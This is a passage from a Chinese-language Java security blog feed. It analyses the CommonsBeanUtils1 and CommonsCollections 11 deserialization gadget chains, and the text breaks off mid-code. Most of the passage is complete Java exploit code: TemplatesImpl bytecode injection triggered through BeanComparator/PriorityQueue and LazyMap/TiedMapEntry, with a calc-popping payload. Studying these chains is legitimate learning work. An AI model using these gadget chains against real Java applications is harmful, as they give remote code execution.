Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123306.png" alt="image-20230715112304115"><br>然后就是最终的EXP编写，这里先看一下<code>BeanComparator.compare()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123714.png" alt="image-20230715112317466"><br>这个方法首先接收两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。<br>既然要进行比较那么就需要新建一个 <code>PriorityQueue</code> 的队列，并让其有 2 个值进行比较。而且 <code>PriorityQueue</code> 的构造函数当中就包含了一个比较器。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123453.png" alt="image-20230715112329289"><br>最后使用queue.add可以自动完成比较因为add方法调用了compare方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123078.png" alt="image-20230715112349646"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124073.png" alt="image-20230715112415886"><br>然后就是解决在反序列化的时候才弹计算器，那么就将 queue.add 赋一个普通的常量，再通过反射修改值即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>); </span><br></pre></td></tr></table></figure><p>最终的exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        <span class="comment">// 创建新的队列，并添加恶意字节码  </span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 将 property 的值赋为 outputProperties        </span></span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line"><span class="comment">//        serialize(queue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124308.png" alt="image-20230715112429149"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>这里还是直接加在CC链中的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124392.png" alt="image-20230715112439321"><br>参考：<br>下面这个大佬分析的挺不错的，基本上都是参考他的，也是跟着他的学习路线学的<br><a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">CommonsBeanUtils反序列化 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>其实这条链子白日梦组长在shiro中分析了，后面看到shiro的时候才知道</p><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链11</title>
      <link href="/undefined/35376.html"/>
      <url>/undefined/35376.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>CommonsCollections 3.1-3.2.1</li><li>jdk无限制</li></ul><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>看大佬的博客这调链子是CC2+CC6，这里把完整的调用链流程图放一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151106464.png" alt="image-20230715110638370"><br>其实这条链子就是为后面的shiro可以不通过<code>Transform</code>数组来实现反序列化服务的</p><h3 id="CC2的尾部链TemplatesImpl"><a href="#CC2的尾部链TemplatesImpl" class="headerlink" title="CC2的尾部链TemplatesImpl"></a>CC2的尾部链TemplatesImpl</h3><p>把CC2的后半部分拿来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"><span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>这里为CC2的后半部分，只是加上了对<code>_tfactory</code>的处理，然后利用成功</p><h3 id="CC6的前半部分"><a href="#CC6的前半部分" class="headerlink" title="CC6的前半部分"></a>CC6的前半部分</h3><p>这里CC6的前半部分有点忘记了，接着分析一下，这里是<code>InvokerTransformer.transform()</code>去找到这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107426.png" alt="image-20230715110701262"><br>然后发现<code>LazyMap.get()</code>调用了这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107476.png" alt="image-20230715110714346"><br>然后再去找谁调用了<code>get()</code>方法，这个<code>get()</code>方法挺难找，所以我们就直接看，最终在<code>TiedMapEntry.getValue()</code>方法中找到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107668.png" alt="image-20230715110725585"><br>然后继续找，发现同类下调用了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107753.png" alt="image-20230715110736662"><br>然后就不用继续往下找了，因为在Java反序列化中hashCode方法后面的利用链基本都是下面这条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --自动调用--&gt;   HashMap.hash()</span><br><span class="line">后续利用链.hashCode()</span><br></pre></td></tr></table></figure><p>所以直接到<code>HashMap.hash()</code>中看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108582.png" alt="image-20230715110811501"><br>CC6到这里就结束了，当然exp编写还有很多细节问题处理，下面来逐步编写exp，这里我们先将后半段和LazyMap连起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        lazyGetMethod.invoke(lazyMap, chainedTransformer);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是和<code>TiedMapEntry</code> 类连起来，因为<code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法调用了 <code>LazyMap</code> 的 <code>get()</code> 方法，那么exp就是下面这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后继续往前即<code>hashCode()</code> 方法调用了 <code>getValue()</code> 方法而<code>hashCode()</code>方法调用在前面已经列过了所以直接构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 